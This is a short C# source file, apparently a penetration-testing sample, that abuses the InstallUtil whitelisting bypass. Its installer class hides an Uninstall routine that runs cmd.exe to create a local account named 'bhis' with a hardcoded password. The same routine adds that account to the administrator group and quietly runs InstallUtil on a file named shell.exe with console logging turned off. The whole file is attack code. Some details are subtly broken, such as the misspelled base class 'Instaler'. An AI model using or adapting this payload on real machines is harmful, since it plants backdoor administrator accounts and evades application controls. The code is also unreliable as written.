using System;
  using System.Configuration.Install;
  using System.Runtime.InteropServices;

  public class Program {
    public static void Main() {
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Instaler {
  public override void Uninstall(System.Collections.IDictionary savedState) {
    Mycode.Exec();
  }
}

public class Mycode {
  public static void Exec() {
    System.Diagnostics.Process.Start("CMD.exe", "/C net user /add bhis supercoolpass1");
    System.Diagnostics.Process.Start("CMD.exe", "/C net localgroup Administrator bhis /add");
    System.Diagnostics.Process.Start("C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe","/logfile=C:\\Users\\Public\\log5.txt /LogToConsole=false /U C:\\Users\\Public\\shell.exe");
  }
}
